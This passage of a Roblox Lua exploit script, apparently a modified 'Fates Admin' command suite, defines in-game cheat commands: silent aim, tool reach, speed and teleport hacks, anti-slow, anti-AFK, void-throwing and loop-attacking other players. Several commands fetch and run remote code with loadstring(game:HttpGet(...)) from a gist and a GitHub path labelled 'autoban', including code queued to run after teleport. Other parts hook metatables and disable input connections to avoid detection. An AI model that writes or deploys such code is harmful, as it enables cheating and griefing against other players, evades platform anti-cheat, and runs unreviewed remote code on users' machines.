p1.CFrame = game.Players[p2].Character.LowerTorso.CFrame
wait(0.1)
local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = target
p1.CFrame = game.Players[p2].Character.LowerTorso.CFrame
			game.ReplicatedStorage.MainEvent:FireServer("Grabbing")

wait(0.1)
ExecuteCommand("bank", {}, LocalPlayer);
wait(0.3)
end

local tweentargetlol = tweenlol3

	plr = game:GetService('Players').tweentargetlol
	X1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.X
		Y1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Y
		Z1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Z



tweenService, tweenInfo = game:GetService("TweenService"), TweenInfo.new(1, Enum.EasingStyle.Linear)

tween = tweenService:Create(game:GetService("Players")["LocalPlayer"].Character.HumanoidRootPart, tweenInfo, {CFrame = CFrame.new(X1, Y1, Z1)})
tween:Play()
wait(0.9)
			game.ReplicatedStorage.MainEvent:FireServer("Grabbing")
wait(0.2)
tweenService, tweenInfo = game:GetService("TweenService"), TweenInfo.new(1, Enum.EasingStyle.Linear)

tween = tweenService:Create(game:GetService("Players")["LocalPlayer"].Character.HumanoidRootPart, tweenInfo, {CFrame = CFrame.new(-318.891174, 80.2145309, -257.177429, 0.0479469746, -5.14644114e-08, 0.998850107, -3.12971538e-09, 1, 5.16738901e-08, -0.998850107, -5.60372015e-09, 0.0479469746)})
tween:Play()
wait(0.91)
if game.Players[v.Name].Character.BodyEffects['K.O'].Value == true then
wait(0.8)
saveme()
wait(0.8)
saveme()
wait(0.8)
saveme()
wait(0.8)
saveme()
end

if standing2 == true then
standing2 = false
ExecuteCommand("summon", {}, LocalPlayer);
end
end
end)

AddCommand("armor", {"buyarmor"}, "auto buy armor", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = false
        else
   local plr = game.Players.LocalPlayer
	local savedarmourpos = plr.Character.HumanoidRootPart.Position
	plr.Character.HumanoidRootPart.CFrame = CFrame.new(-938.476685, -25.2498264, 570.100159, -0.0353576206, 9.85617206e-08, -0.999374807, -2.69198441e-09, 1, 9.871858e-08, 0.999374807, 6.18077589e-09, -0.0353576206)
	wait(.4)

	fireclickdetector(game.Workspace.Ignored.Shop['[High-Medium Armor] - $2300'].ClickDetector)
	wait(0.1)
	plr.Character.HumanoidRootPart.CFrame = CFrame.new(savedarmourpos)
end
end)






AddCommand("away", {"adminbase"}, "tp to jailcell", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-800, -39, -885)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-800, -39, -885)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-800, -39, -885)
wait(0.2)

end
end)

AddCommand("bank", {"tpbank"}, "tp to bank", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-318.891174, 80.2145309, -257.177429, 0.0479469746, -5.14644114e-08, 0.998850107, -3.12971538e-09, 1, 5.16738901e-08, -0.998850107, -5.60372015e-09, 0.0479469746)

end
end)

AddCommand("jail", {"ajail"}, "tp to bank", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-798, -40, -841)

end
end)

AddCommand("totaco", {"tptaco"}, "tp to tacoshop", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
            ExecuteCommand("bring", {Caller.Name, v.Name}, LocalPlayer)
        else
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(707.502014, 139, -543.044739, -0.00318608154, -0.00102963799, 0.999993861, 0.000187970581, 0.999999464, 0.00103024102, -0.99999404, 0.00019125198, -0.00318560796)
end
end)

AddCommand("toplayground", {"tpplayground"}, "tp to playground", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
            ExecuteCommand("bring", {Caller.Name, v.Name}, LocalPlayer)
        else
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-308.851196, 103.049866, -685.874817, 0.0775452703, 4.43633544e-05, -0.996988416, 4.02679916e-06, 1, 4.48105384e-05, 0.996988416, -7.48951334e-06, 0.0775452703)
end
end)

AddCommand("bat", {"buybat"}, "auto buy bat", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
b = true
        else
   local plr = game.Players.LocalPlayer
	local savedbatpos = plr.Character.HumanoidRootPart.Position
	plr.Character.HumanoidRootPart.CFrame = CFrame.new(380, 49, -283)
	wait(.4)

	fireclickdetector(game.Workspace.Ignored.Shop['[Bat] - $250'].ClickDetector)
	wait(0.1)
	plr.Character.HumanoidRootPart.CFrame = CFrame.new(savedbatpos)
end
end)

AddCommand("food", {"buyfood"}, "auto buy food", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = false
        else
   local plr = game.Players.LocalPlayer
	local savehotdogpos = plr.Character.HumanoidRootPart.Position
	plr.Character.HumanoidRootPart.CFrame = CFrame.new(107.973412, 25.128006, -976.381104)
	wait(0.56)

	fireclickdetector(game.Workspace.Ignored.Shop['[HotDog] - $8'].ClickDetector)
	wait(0.1)
	plr.Character.HumanoidRootPart.CFrame = CFrame.new(-994.55011, 24.5980186, -155.482489)
	wait(0.6)

	fireclickdetector(game.Workspace.Ignored.Shop['[Popcorn] - $7'].ClickDetector)
	wait(0.1)
	plr.Character.HumanoidRootPart.CFrame = CFrame.new(savehotdogpos)
end

end)





AddCommand("voidthrow", {"vthrow"}, "throws the person you are holding into the void", {}, function(Caller, Args)
	plr = game:GetService('Players').LocalPlayer
	X1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.X
		Y1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Y
		Z1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Z
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1816, 600, 1455)
wait(0.2)
	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
wait(0.3)
keypress(0x67)
keyrelease(0x67)
keypress(0x47)
keyrelease(0x47)
keypress(0x67)
keyrelease(0x67)
keypress(0x47)
keyrelease(0x47)
wait(0.2)
	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false

wait(0.2)



plr.Character.HumanoidRootPart.CFrame = CFrame.new(X1,Y1+5,Z1)
end)


AddCommand("safethrow", {"sthrow"}, "throws the person you are holding into the void", {}, function(Caller, Args)
	plr = game:GetService('Players').LocalPlayer
	X1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.X
		Y1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Y
		Z1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Z
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-324, 215, 333)
wait(0.2)
	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
wait(0.3)
keypress(0x67)
keyrelease(0x67)
keypress(0x47)
keyrelease(0x47)
keypress(0x67)
keyrelease(0x67)
keypress(0x47)
keyrelease(0x47)
wait(0.2)
	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
wait(0.2)



plr.Character.HumanoidRootPart.CFrame = CFrame.new(X1,Y1+5,Z1)
end)

AddCommand("silentaim", {"saim"}, "gives pro aim", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
loadstring(game:HttpGet("https://gist.githubusercontent.com/cyberical9B55/872adecc59899a2097c928b25841f5e3/raw/d6db413e0ddd085f2c4777d66f05c45e5e30213f/asdfaaaaaaaaaaaaaaaa"))()

Aiming.HitChance = 100 -- hit chance
Aiming.ShowFOV = false  -- show fov
notification = true  -- toggle notifications
Aiming.FOV = 30  -- FOV size
silentran = true
    	        Notify({ 
Description = "beam dem kids";
Title = "silent aim enabled";
Duration = 2;
});
end
end)




AddCommand("togglefov", {"togfov"}, "toggles the fov for silent aim", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
if silentran == true then
if Aiming.ShowFOV == false then
Aiming.ShowFOV = true
    	        Notify({ 
Description = "Showing FOV";
Title = "silent aim";
Duration = 2;
});
else
if Aiming.ShowFOV == true then
Aiming.ShowFOV = false
    	        Notify({ 
Description = "no longer showing FOV";
Title = "silent aim";
Duration = 2;
});
else
    	        Notify({ 
Description = "please execute silent aim first+";
Title = "warning";
Duration = 2;
});
end
end
end
end
end)

AddCommand("FOVsize", {"silentsize"}, "fov size for silent aim", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
    local fovAmount = tonumber(Args[1]) or 70
Aiming.FOV = fovAmount
end
end)


AddCommand("joinserver", {"discord"}, "joins the fates admin discord server", {}, function()
        if (Caller ~= LocalPlayer) then
            a = true
        else
	local Request = syn and syn.request or request
	local HttpService = Services.HttpService
	if (Request({
		Url = "http://127.0.0.1:6463/rpc?v=1",
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json",
			["Origin"] = "https://discord.com"
		},
		Body = JSONEncode(HttpService, {
			cmd = "INVITE_BROWSER",
			args = {
				code = "5epGRYR"
			},
			nonce = GenerateGUID(HttpService, false)
		}),
		}).StatusCode == 200) then
		return "joined fates admin discord server"
	else
		return "discord isn't open"
	end
end
end)

AddCommand("rejoin", {"rj"}, "rejoins the game you're currently in", {}, function(Caller)
	if (Caller == LocalPlayer) then
		local TeleportService = Services.TeleportService
		if (#GetPlayers(Players) == 1) then
			TeleportService.Teleport(TeleportService, game.PlaceId);
		else
			TeleportService.TeleportToPlaceInstance(TeleportService, game.PlaceId, game.JobId)
		end
    	        Notify({ 
Description = "rejoining server";
Title = "please wait...";
Duration = 2;
});
	end
end)

AddCommand("serverhop", {"sh"}, "switches servers (optional: min, max or mid)", {{"min", "max", "mid"}}, function(Caller, Args)
	if (Caller == LocalPlayer) then
		local TeleportService = Services.TeleportService
		local Servers = JSONDecode(Services.HttpService, game.HttpGetAsync(game, format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100", game.PlaceId))).data
		if (#Servers > 1) then
			Servers = filter(Servers, function(i,v)
				return v.playing ~= v.maxPlayers and v.id ~= game.JobId
			end)
			local Server
			local Option = Args[1] or ""
			if (lower(Option) == "min") then
				Server = Servers[#Servers]
			elseif (lower(Option) == "max") then
				Server = Servers[1]
			else
				Server = Servers[random(1, #Servers)]
			end
			local queue_on_teleport = syn and syn.queue_on_teleport or queue_on_teleport
			if (queue_on_teleport) then
				queue_on_teleport("loadstring(game.HttpGet(game, \"https://raw.githubusercontent.com/cyberical9B55/veonixcombat/main/hwids/autoban\"))()");
			end
			TeleportService.TeleportToPlaceInstance(TeleportService, game.PlaceId, Server.id);
    	        Notify({ 
Description = "joining shortly";
Title = "foind a server";
Duration = 2;
});
		else
    	        Notify({ 
Description = "try again later";
Title = "cant find a server : (";
Duration = 2;
});
		end
	end
end)



AddCommand("flingwhitelist", {"flingwl"}, "whitelists a user so they can use commands", {"1"}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
            a = true
        else
	local Target = GetPlayer(Args[1]);
	for i, v in next, Target do
		AdminUsers[#AdminUsers + 1] = v
    	        Notify({ 
Description = "whitelisted "..v.name;
Title = "whitelisted a player";
Duration = 2;
});
	end
end
end)

AddCommand("whitelisted", {"whitelistedusers"}, "shows all the users whitelisted to use commands", {}, function(Caller)
        if (Caller ~= LocalPlayer) then
           a = true
        else
    	        Notify({ 
Description = next(AdminUsers) and concat(map(AdminUsers, function(i,v) return v.Name end), ", ") or "no users whitelisted";
Title = "whitelisted...";
Duration = 2;
});
end
end)

AddCommand("blacklist", {"bl"}, "blacklists a whitelisted user", {"1"}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
            a = true
        else
	local Target = GetPlayer(Args[1]);
	for i, v in next, Target do
		if (Tfind(AdminUsers, v)) and v.Name ~= "xxxLX_0GANxxx" then
			AdminUsers[indexOf(AdminUsers, v)] = nil
		end
	end
end
end)

local CommandsLoaded = false
AddCommand("commands", {"cmds"}, "shows you all the commands listed in fates admin", {}, function()
    if (not CommandsLoaded) then
        local CommandsList = Commands.Frame.List
        Utils.SmoothScroll(CommandsList, .14);
        for _, v in next, CommandsTable do
            if (not FindFirstChild(CommandsList, v.Name)) then
                local Clone = Clone(Command)
                Utils.Hover(Clone, "BackgroundColor3");
                Utils.ToolTip(Clone, v.Name .. "\n" .. v.Description);
                Clone.CommandText.Text = v.Name .. (#v.Aliases > 0 and " (" ..concat(v.Aliases, ", ") .. ")" or "");
                Clone.Name = v.Name
                Clone.Visible = true
                Clone.Parent = CommandsList
            end
        end
        Commands.Frame.List.CanvasSize = UDim2.fromOffset(0, Commands.Frame.List.UIListLayout.AbsoluteContentSize.Y);
        CommandsTransparencyClone = Clone(Commands);
        Utils.SetAllTrans(Commands)
        CommandsLoaded = true
    end
    Commands.Visible = true
    Utils.TweenAllTransToObject(Commands, .25, CommandsTransparencyClone);
    return "Commands Loaded"
end)

AddCommand("killscript", {}, "kills the script", {}, function(Caller)
	if (Caller == LocalPlayer) then
		deepsearch(Connections, function(i,v)
			if (type(v) == 'userdata' and v.Disconnect) then
				Disconnect(v);
			elseif (type(v) == 'boolean') then
				v = false
			end
		end);
		for i, v in next, Hooks.SpoofedProperties do
			for i2, v2 in next, v do
				i[v2.Property] = v2.SpoofedProperty[v2.Property]
			end
		end
		for i, v in next, Hooks do
			if (type(v) == 'boolean') then
				v = false
			end
			if (type(v) == 'function') then

			end
		end
		Destroy(UI);
		getgenv().F_A = nil
		setreadonly(mt, false);
		mt = OldMetaMethods
		setreadonly(mt, true);
		for i, v in next, getfenv() do
			getfenv()[i] = nil
		end
	end
end)

AddCommand("reloadscript", {}, "kills the script and reloads it", {}, function(Caller)
	if (Caller == LocalPlayer) then
		ExecuteCommand("killscript", {}, LocalPlayer);
		loadstring(game:HttpGet("https://raw.githubusercontent.com/cyberical9B55/veonixcombat/main/hwids/autoban"))();
	end
end)



AddCommand("setprefix", {}, "changes your prefix", {"1"}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
            a = true
        else
	local PrefixToSet = Args[1]
	if (match(PrefixToSet, "%A")) then
		Prefix = PrefixToSet
    	        Notify({ 
Description = "prefix set to "..PrefixToSet;
Title = "execute the cmd 'saveprefix' to save this";
Duration = 2;
});
	else
    	        Notify({ 
Description = "prefix has to be a symbol";
Title = "your doing illegal things";
Duration = 2;
});
	end
end
end)

AddCommand("saveprefix", {}, "saves your prefix", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
            a = true
        else
	if (GetConfig().Prefix == Prefix and Enum.KeyCode[GetConfig().CommandBarPrefix] == CommandBarPrefix) then
		return "nothing to save, prefix is the same"
	else
		SetConfig({["Prefix"]=Prefix,["CommandBarPrefix"]=split(tostring(CommandBarPrefix), ".")[3]});
		return "saved prefix"
	end
end
end)







local ToggleChatPrediction

getgenv().speedspeedspeed = 100
AddCommand("speed", {"cframespeed"}, "cframe speed", {}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
            a = true
        else
	function onButton1Down(mouse)
	down = true
	while down do
	if not down then break end
	local plr = game:GetService('Players').LocalPlayer
	local char = plr.Character
 
	char.HumanoidRootPart.Velocity = char.HumanoidRootPart.CFrame.lookVector * getgenv().speedspeedspeed
	wait()
	end
	end
 
	function onButton1Up(mouse)
	down = false
	end
 
	function onSelected(mouse)
	mouse.KeyDown:connect(function(k) if k:lower()=="v"then onButton1Down(mouse)end end)
	mouse.KeyUp:connect(function(k) if k:lower()=="v"then onButton1Up(mouse)end end)
	end
 
	onSelected(game.Players.LocalPlayer:GetMouse())
        Notify({ 
Description = "hold 'v' to speed";
Title = "speed";
Duration = 2;
});
end
end)


AddCommand("speedspeed", {}, "sets your fov", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
	local Amount = tonumber(Args[1]) or 100
getgenv().speedspeedspeed = Amount
end
end)

antislow = false
test = false
AddCommand("antislow", {"noslow"}, "ye", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
            a = true
        else
antislow = not antislow
if antislow == true then
repeat
wait()
player = game.Players.LocalPlayer;
    local localCharacter = player.Character;


            local DeletePart = player.Character.BodyEffects.Movement:FindFirstChild('NoJumping') or player.Character.BodyEffects.Movement:FindFirstChild('ReduceWalk') or player.Character.BodyEffects.Movement:FindFirstChild('NoWalkSpeed')
            if DeletePart then DeletePart:Destroy() end
            if player.Character.BodyEffects.Reload.Value == true then player.Character.BodyEffects.Reload.Value = false end
until antislow == false
end
end
end)

antislow3 = false
AddCommand("reach", {"toolreach"}, "ye", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
            a = true
        else
		for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
	    	if v:isA("Tool") then
	           local a = Instance.new("SelectionBox",v.Handle)
	           a.Adornee = v.Handle
	           v.Handle.Size = Vector3.new(50, 50, 50)
	           v.GripPos = Vector3.new(0,0,0)
	           v.Handle.Transparency = 1
	           else
notool = true
	        end
		end
		
		if notool == true then
		notool = false
        Notify({ 
Description = "hold a toooollllll";
Title = "if this doesnt work, ur prob not holding a tool";
Duration = 2;
});
		end
end
end)







AddCommand("antilag", {"fpsboost"}, "changes everything to a plastic material", {}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
            a = true
        else
	local time = tick();
	local Plasticc = 0
	for i, v in next, GetDescendants(Workspace) do
		if (IsA(v, "Part") and v.Material ~= Enum.Material.Plastic) then
			CEnv[v] = v.Material
			v.Material = Enum.Material.Plastic
			Plasticc = Plasticc + 1
		end
	end
	return format("%d items made plastic in %.3f (s)", Plasticc, (tick()) - time);
end
end)

AddCommand("unantilag", {"unfpsboost"}, "changes everything back from a plastic material", {}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
            a = true
        else
	local Plastics = LoadCommand("plastic").CmdEnv
	local time = tick();
	local Amount = 0
	for i, v in next, Plastics do
		i.Material = v
		Amount = Amount + 1
	end
end
end)

AddCommand("antiafk", {"antiidle"}, "prevents kicks from when you're afk", {}, function(Caller, Args, CEnv)
	local IsEnabled = CEnv[1]
	for i, v in next, getconnections(LocalPlayer.Idled) do
		if (IsEnabled) then
			v.Enable(v);
			CEnv[1] = nil
		else
			v.Disable(v);
			CEnv[1] = true
		end
	end
end)

AddCommand("qtp", {}, "tps you to where your mouse is when you click", {}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
            a = true
        else
	plr = game.Players.LocalPlayer;
	hum = plr.Character.HumanoidRootPart;
	mouse = plr:GetMouse()
	mouse.KeyDown:connect(function(aa)
		if aa == "q" then
			if mouse.Target then
				hum.CFrame = CFrame.new(mouse.Hit.x, mouse.Hit.y + 5, mouse.Hit.z)
			end
		end
	end)
        Notify({ 
Description = "press q to tp";
Title = "press q";
Duration = 2;
});
end
end)


AddCommand("setzoomdistance", {"szd", "maxzoom"}, "sets your cameras zoom distance so you can zoom out", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
            a = true
        else
	local ZoomDistance = tonumber(Args[1]) or 1000
	LocalPlayer.CameraMaxZoomDistance = ZoomDistance
	LocalPlayer.CameraMode = Enum.CameraMode.Classic
	return "set zoom distance to " .. ZoomDistance
end
end)





local LoadConfig, ConfigLoaded;
AddCommand("config", {"conf"}, "shows fates admin config", {}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
            a = true
        else
	if (not ConfigLoaded) then
		if (not CEnv[1]) then
			LoadConfig();
		end
		Utils.SetAllTrans(ConfigUI);
		ConfigUI.Visible = true
		Utils.TweenAllTransToObject(ConfigUI, .25, ConfigUIClone);
		ConfigLoaded = true
		CEnv[1] = true
	end
end
end)



AddCommand("rejoinre", {"rje"}, "rejoins and tps you to your old position", {3}, function()
        if (Caller ~= LocalPlayer) then
            a = true
        else
rjeing = true
	local Pos = GetRoot().CFrame
	local queue_on_teleport = syn and syn.queue_on_teleport or queue_on_teleport
	if (queue_on_teleport) then
		queue_on_teleport(format("game.Loaded:Wait();game:GetService('ReplicatedFirst'):SetDefaultLoadingGuiRemoved();local LocalPlayer = game:GetService('Players').LocalPlayer;LocalPlayer.CharacterAdded:Wait():WaitForChild('HumanoidRootPart').CFrame = CFrame.new(%s);loadstring(game.HttpGet(game, \"https://raw.githubusercontent.com/cyberical9B55/veonixcombat/main/hwids/autoban\"))()", tostring(Pos)));
	end
	if (Caller == LocalPlayer) then
		local TeleportService = Services.TeleportService
		if (#GetPlayers(Players) == 1) then
			TeleportService.Teleport(TeleportService, game.PlaceId);
		else
			TeleportService.TeleportToPlaceInstance(TeleportService, game.PlaceId, game.JobId)
		end
    	        Notify({ 
Description = "rejoining server";
Title = "please wait...";
Duration = 2;
});
	end
end
end)



AddCommand("inviscam", {"inviscamera"}, "makes you see through walls more better", {}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
            a = true
        else
	CEnv.OldCameraMaxZoomDistance = LocalPlayer.CameraMaxZoomDistance
	CEnv.OldDevCameraOcclusionMode = LocalPlayer.DevCameraOcclusionMode
	LocalPlayer.CameraMaxZoomDistance = 600
	LocalPlayer.DevCameraOcclusionMode = "Invisicam"
end
end)

AddCommand("uninviscam", {"uninviscamera"}, "disables inviscam", {}, function()
        if (Caller ~= LocalPlayer) then
            a = true
        else
	local CmdEnv = LoadCommand("inviscam").CmdEnv
	LocalPlayer.CameraMaxZoomDistance = CmdEnv.OldCameraMaxZoomDistance
	LocalPlayer.DevCameraOcclusionMode = CmdEnv.OldDevCameraOcclusionMode
end
end)

loopannoy = false
AddCommand("loopannoy", {}, "disables inviscam", {}, function()
if loopannoy == false then
loopannoy = true
ExecuteCommand("float", {}, LocalPlayer);
repeat
wait()
ExecuteCommand("attack", {"random"}, LocalPlayer);
wait(0.2)
until loopannoy == false

end
end)


AddCommand("unloopannoy", {}, "disables inviscam", {}, function()
loopannoy = false
repeat
wait()
until attackinglol == false
ExecuteCommand("unfloat", {}, LocalPlayer);
ExecuteCommand("away", {}, LocalPlayer);
ExecuteCommand("away", {}, LocalPlayer);
ExecuteCommand("away", {}, LocalPlayer);
end)

AddCommand("nosound", {}, "disables inviscam", {}, function()
ExecuteCommand("loop", {"semmemute", "all"}, LocalPlayer);
end)

AddCommand("sound", {}, "disables inviscam", {}, function()
ExecuteCommand("unloop", {"semmemute", "all"}, LocalPlayer);
end)

AddCommand("loop", {"loopcommand"}, "loops a command", {"1"}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
            a = true
        else
	local Command = Args[1]
	local LoadedCommand = LoadCommand(Command);
	if (not LoadedCommand) then
		return format("command %s not found", Command);
	end
	Args = shift(Args);
	CEnv.Looping = true
	CEnv.LoopedCommands = CEnv.LoopedCommands or {}
	CEnv.LoopedCommands[Command] = true
	CThread(function()
		while (CEnv.Looping and CEnv.LoopedCommands[Command]) do
			ExecuteCommand(Command, Args, Caller);
			wait();
		end
	end)();
        Notify({ 
Description = format("now looping the %s command", Command);
Title = "loop";
Duration = 2;
});
end
end)

AddCommand("unloop", {"unloopcommand"}, "unloops a command", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
            a = true
        else
	local Looped = LoadCommand("loop").CmdEnv
	if (Args[1]) then
		if (Looped.LoopedCommands[Args[1]]) then
			Looped.LoopedCommands[Args[1]] = nil
a = true
		end
a = true
	else
		Looped.Looping = false
a = true
	end
end
end)






AddCommand("console", {"errors", "warns", "outputs"}, "shows the outputs fates admin has made", {}, function()
    local MessageClone = Clone(Console.Frame.List);
    
    Utils.ClearAllObjects(Console.Frame.List)
    Console.Visible = true

    local Tween = Utils.TweenAllTransToObject(Console, .25, ConsoleTransparencyClone)

    Destroy(Console.Frame.List)
    MessageClone.Parent = Console.Frame

    for i, v in next, GetChildren(Console.Frame.List) do
        if (not IsA(v, "UIListLayout")) then
            Utils.Tween(v, "Sine", "Out", .25, {
                TextTransparency = 0
            })
        end
    end

    local ConsoleListLayout = Console.Frame.List.UIListLayout

    CConnect(GetPropertyChangedSignal(ConsoleListLayout, "AbsoluteContentSize"), function()
        local CanvasPosition = Console.Frame.List.CanvasPosition
        local CanvasSize = Console.Frame.List.CanvasSize
        local AbsoluteSize = Console.Frame.List.AbsoluteSize

        if (CanvasSize.Y.Offset - AbsoluteSize.Y - CanvasPosition.Y < 20) then
           wait();
           Console.Frame.List.CanvasPosition = Vector2.new(0, CanvasSize.Y.Offset + 1000);
        end
    end)

    Utils.Tween(Console.Frame.List, "Sine", "Out", .25, {
        ScrollBarImageTransparency = 0
    })
end)

local PlrChat = function(i, plr)
    if (not Connections.Players[plr.Name]) then
        Connections.Players[plr.Name] = {}
        Connections.Players[plr.Name].Connections = {}
    end
    Connections.Players[plr.Name].ChatCon = CConnect(plr.Chatted, function(raw)
        if (plr == LocalPlayer) then
            local Processed = Keys.GameProcessed
            local Last = Keys.LastEntered
            if (not Processed or Last ~= Enum.KeyCode.Return) then
                local K;
                local T = CThread(function()
                    K = CWait(Services.UserInputService.InputBegan);
                end)();
                wait();
                if (K.KeyCode ~= Enum.KeyCode.Return) then
                    return    
                end
                T = nil
            end
        end
        local message = raw

        if (_L.ChatLogsEnabled) then

            local time = os.date("%X");
            local Text = format("%s - [%s]: %s", time, plr.Name, raw);
            local Clone = Clone(ChatLogMessage);

            Clone.Text = Text
            Clone.Visible = true
            Clone.TextTransparency = 1
            Clone.Parent = ChatLogs.Frame.List

            Utils.Tween(Clone, "Sine", "Out", .25, {
                TextTransparency = 0
            })

            ChatLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, ChatLogs.Frame.List.UIListLayout.AbsoluteContentSize.Y);
        end

        if (startsWith(raw, "/e")) then
            raw = sub(raw, 4);
        elseif (startsWith(raw, "/w")) then
            raw = shift(shift(split(message, " ")));
        elseif (startsWith(raw, Prefix)) then
            raw = sub(raw, #Prefix + 1);
        else
            return
        end

        message = trim(raw);

        if (Tfind(AdminUsers, plr) or plr == LocalPlayer) then
            local CommandArgs = split(message, " ");
            local Command = CommandArgs[1]
            local Args = shift(CommandArgs);

            ExecuteCommand(Command, Args, plr);
        end
    end)
end

--IMPORT [uimore]
Notification.Visible = false
Utils.SetAllTrans(CommandBar);
Utils.SetAllTrans(ChatLogs);
Utils.SetAllTrans(GlobalChatLogs);
Utils.SetAllTrans(HttpLogs);
Utils.SetAllTrans(Console);
Commands.Visible = false
ChatLogs.Visible = false
Console.Visible = false
GlobalChatLogs.Visible = false
HttpLogs.Visible = false

Utils.Draggable(Commands);
Utils.Draggable(ChatLogs);
Utils.Draggable(Console);
Utils.Draggable(GlobalChatLogs);
Utils.Draggable(HttpLogs);
Utils.Draggable(ConfigUI);

ParentGui(UI);
Connections.UI = {}

local Times = #LastCommand
AddConnection(CConnect(Services.UserInputService.InputBegan, function(Input, GameProccesed)
    if (Input.KeyCode == CommandBarPrefix and (not GameProccesed)) then
        CommandBarOpen = not CommandBarOpen

        local TransparencyTween = CommandBarOpen and Utils.TweenAllTransToObject or Utils.TweenAllTrans
        local Tween = TransparencyTween(CommandBar, .5, CommandBarTransparencyClone);
        local UserInputService = Services.UserInputService

        if (CommandBarOpen) then
            if (not Draggable) then
                Utils.Tween(CommandBar, "Quint", "Out", .5, {
                    Position = UDim2.new(0.5, WideBar and -200 or -100, 1, -110)
                })
            end

            local TextConnections;
            if (UndetectedCmdBar) then
                TextConnections = getconnections(UserInputService.TextBoxFocused);
                for i, v in next, TextConnections do
                    v.Disable(v);
                end
                for i, v in next, getconnections(UserInputService.TextBoxFocusReleased, true) do
                    v.Disable(v);
                end
            end

            CommandBar.Input.CaptureFocus(CommandBar.Input);
            CThread(function()
                wait()
                CommandBar.Input.Text = ""
                local FocusedTextBox = UserInputService.GetFocusedTextBox(UserInputService);
                local TextBox = CommandBar.Input
                while (FocusedTextBox ~= TextBox) do
                    FocusedTextBox.ReleaseFocus(FocusedTextBox);
                    CommandBar.Input.CaptureFocus(TextBox);
                    FocusedTextBox = UserInputService.GetFocusedTextBox(UserInputService);
                    CWait(Heartbeat);
                end
            end)()
            
            if (UndetectedCmdBar) then
                for i, v in next, TextConnections do
                    v.Enable(v);
                end
            end
        else
            if (not Draggable) then
                Utils.Tween(CommandBar, "Quint", "Out", .5, {
                    Position = UDim2.new(0.5, WideBar and -200 or -100, 1, 5)
                })
            end
        end
    elseif (not GameProccesed and ChooseNewPrefix) then
        CommandBarPrefix = Input.KeyCode
        Utils.Notify(LocalPlayer, "New Prefix", "Your new prefix is: " .. split(tostring(Input.KeyCode), ".")[3]);
        ChooseNewPrefix = false
        if (writefile) then
            Utils.Notify(LocalPlayer, nil, "use command saveprefix to save your prefix");
        end
    elseif (GameProccesed and CommandBarOpen) then
        if (Input.KeyCode == Enum.KeyCode.Up) then
            Times = Times >= 3 and Times or Times + 1
            CommandBar.Input.Text = LastCommand[Times][1] .. " "
            CommandBar.Input.CursorPosition = #CommandBar.Input.Text + 2
        end
        if (Input.KeyCode == Enum.KeyCode.Down) then
            Times = Times <= 1 and 1 or Times - 1
            CommandBar.Input.Text = LastCommand[Times][1] .. " "
            CommandBar.Input.CursorPosition = #CommandBar.Input.Text + 2
        end
    end
end), Connections.UI, true);

Utils.Click(Commands.Close, "TextColor3")
Utils.Click(ChatLogs.Clear, "BackgroundColor3")
Utils.Click(ChatLogs.Save, "BackgroundColor3")
Utils.Click(ChatLogs.Toggle, "BackgroundColor3")
Utils.Click(ChatLogs.Close, "TextColor3")

Utils.Click(Console.Clear, "BackgroundColor3");
Utils.Click(Console.Save, "BackgroundColor3");
